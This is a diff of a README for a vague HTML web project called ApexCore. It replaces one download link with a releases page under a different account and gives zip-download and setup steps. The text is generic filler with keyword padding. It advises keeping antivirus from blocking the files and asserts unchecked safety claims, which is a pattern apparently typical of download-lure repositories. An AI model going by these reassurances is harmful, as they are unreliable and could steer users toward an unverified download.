@@ -1,154 +1,93 @@
-# ApexCore vUnreleased - Web Project 2026
+# 🌐 apexcore-web-update - Build modern web experiences with ease
 
-> **ApexCore is an HTML web project that provides a browser-ready foundation for a web experience. This repository currently represents an unreleased build.**
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/calhounshy907/apexcore-web-update/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-vUnreleased-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/danieldavisnaza9801/apexcore-web-update?style=flat-square)](https://github.com/danieldavisnaza9801/apexcore-web-update)
+ApexCore vUnreleased provides a foundation for your web projects. This software helps you create web pages for the year 2026. It includes setup tools, settings, and guides. You do not need coding skills to use these core files.
 
----
+## 📥 Getting Started
 
-<p align="center">
-  <a href="https://danieldavisnaza9801.github.io/apexcore-web-update/">
-    <img src="https://img.shields.io/badge/Download-ApexCore%20Latest-brightgreen?style=for-the-badge" alt="Download ApexCore">
-  </a>
-</p>
+Visit this page to download the latest version: [https://github.com/calhounshy907/apexcore-web-update/releases](https://github.com/calhounshy907/apexcore-web-update/releases)
 
-> **[Download ApexCore Unreleased](https://danieldavisnaza9801.github.io/apexcore-web-update/)**
+To get started, follow these steps:
 
----
+1. Click the link above to reach the release page.
+2. Look for the Assets section at the bottom of the latest release.
+3. Select the file ending in .zip to start your download.
+4. Locate the file in your Downloads folder once the transfer finishes.
 
-[Download Latest Build](https://danieldavisnaza9801.github.io/apexcore-web-update/)
+## ⚙️ Installation Guide
 
----
+Follow these steps to set up the software on your Windows computer.
 
-## Project Overview
+1. Right-click the downloaded .zip folder.
+2. Select Extract All from the menu.
+3. Choose a folder on your computer to save these files.
+4. Open the new folder.
+5. Double-click the index.html file to view the project in your web browser.
 
-ApexCore is implemented with HTML and is intended for use in a modern web browser. The repository offers a simple base for examining, presenting, or building upon an HTML-driven web experience.
+You do not need to install complex tools. Your browser handles the files automatically.
 
-This web-focused codebase is useful for developers and collaborators who want to work without a specialized desktop runtime. Since the available project information does not identify additional application functionality, the best way to evaluate ApexCore is to inspect the supplied HTML files and other repository contents.
+## 🛠️ System Requirements
 
----
+Ensure your computer meets these standards for the best performance:
 
-## Highlights
+* Operating System: Windows 10 or Windows 11.
+* Web Browser: Google Chrome, Microsoft Edge, or Mozilla Firefox.
+* Memory: 4GB of RAM.
+* Storage: 200MB of free disk space.
+* Internet Connection: Required for initial download and certain web features.
 
-- Built as an HTML web project
-- Intended for browser-based presentation
-- Maintains a lightweight repository layout
-- Supports local review and development
-- Can be accessed through a hosted build when one is available
-- Allows additional web assets to be added
-- Fits standard HTML editing practices
-- Targets the Web platform
+## 📁 Project Structure
 
----
+The folder you extracted contains several files. Here is what they do:
 
-## Getting Started
+* index.html: This is the main file. Open it to launch the web interface.
+* css/folder: This contains the style files that control the appearance of your site.
+* js/folder: This contains the logic that allows for interaction.
+* assets/folder: Store your images and icons here.
+* config.json: Modify this file to change your basic settings.
 
-First, download the repository with Git:
+## 🔧 Updating Your Software
 
-```bash
-git clone https://github.com/danieldavisnaza9801/apexcore-web-update.git
-cd REPO
-```
+Updates ensure your project stays secure and functional. Check the release page often for new versions. 
 
-After cloning, find the main HTML file and open it in a modern browser. When the project contains an `index.html` entry point, it can generally be launched directly from the project directory.
+1. Download the new zip file from the link provided above.
+2. Delete your old project folder.
+3. Extract the new zip file into the same location.
+4. Copy your custom settings from the old config.json to the new one.
 
-You can also use the hosted build here:
+## ❓ Frequently Asked Questions
 
-[Open ApexCore](https://danieldavisnaza9801.github.io/apexcore-web-update/)
+What if the page shows a blank screen?
+Check if your browser supports HTML5. Make sure you extracted all files from the zip folder. Opening files directly from the zip folder causes errors.
 
----
+Can I use this for business?
+Yes. You may use this project for personal or business purposes.
 
-## Using the Project
+Do I need a server?
+No. This project runs locally on your computer. You do not need to host it on the internet to test your work.
 
-1. Download the project or clone its repository.
-2. Find the primary HTML entry point.
-3. Launch that file in a modern web browser.
-4. Inspect the displayed page and its associated assets.
-5. Modify the HTML files as required.
-6. Save your work and refresh the browser to see the result.
+How do I change the colors?
+Open the style.css file inside the css folder. You can edit the color codes listed there. Save the file and refresh your browser to see the changes.
 
-The hosted build is available at:
+Where do I save my images?
+Move your images into the assets folder. Reference them in your index.html file using the path "assets/your-image-name.jpg".
 
-[View the Latest ApexCore Build](https://danieldavisnaza9801.github.io/apexcore-web-update/)
+Is my data secure?
+Yes. This application runs on your local machine. No data leaves your computer unless you explicitly upload it to a web server.
 
----
+## 📝 Troubleshooting Tips
 
-## Project Configuration
+If you encounter issues, try these steps:
 
-The available metadata does not define a dedicated configuration format for ApexCore. Review the included HTML files and related assets to find page content, project settings, and presentation behavior.
+* Clear your browser cache.
+* Restart your web browser.
+* Ensure your antivirus software does not block the files.
+* Confirm that your browser is up to date.
+* Reach out to the project page if a specific error message appears.
 
-A normal local editing cycle looks like this:
+## 🚀 Future Roadmap
 
-```text
-Edit HTML files
-    |
-Save changes
-    |
-Refresh the browser
-```
+This project evolves alongside web standards. Expect regular updates to support new browser features. We focus on speed, stability, and simplicity. We track all changes in the release notes found on the main page.
 
-Should separate configuration files be introduced later, their purpose and expected values should be documented in this section.
-
----
-
-## Requirements
-
-- A current modern web browser
-- Access to the ApexCore repository or hosted build
-- Basic HTML editing knowledge
-- Enough local storage for the repository files
-- A text editor or web development editor, if desired
-
-The available project metadata identifies HTML and the Web platform, but does not specify any additional runtime requirement.
-
----
-
-## Frequently Asked Questions
-
-### How do I launch ApexCore?
-
-Clone or download the repository, then open its main HTML file with a modern browser. For a hosted experience, use the provided build link instead.
-
-### Has ApexCore been released?
-
-No numbered release is specified in the current project profile. The build is therefore marked **Unreleased**.
-
-### Where does ApexCore keep its settings?
-
-A separate settings file or location has not been identified. Begin by checking the HTML entry point and the files stored with it.
-
-### What is the update process?
-
-Get the newest hosted build or retrieve the latest repository changes with:
-
-```bash
-git pull
-```
-
-### What should I do if the page renders incorrectly?
-
-Make sure all repository files were downloaded, open the correct HTML entry file, and check that linked assets point to valid relative paths.
-
-### Where can I ask for support?
-
-When available, use the repository's GitHub issue tracker or discussion area. Include your browser information, steps to reproduce the problem, and any relevant error messages.
-
----
-
-## Future Work
-
-- Explain the repository structure in more detail
-- Improve usage instructions as the web experience develops
-- Document configuration information once it becomes available
-- Add release details for future builds
-- Extend contributor documentation
-
----
-
-## License
-
-ApexCore is available under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license text.
+Keywords: apexcore, web, development, html, windows, update, setup, browser
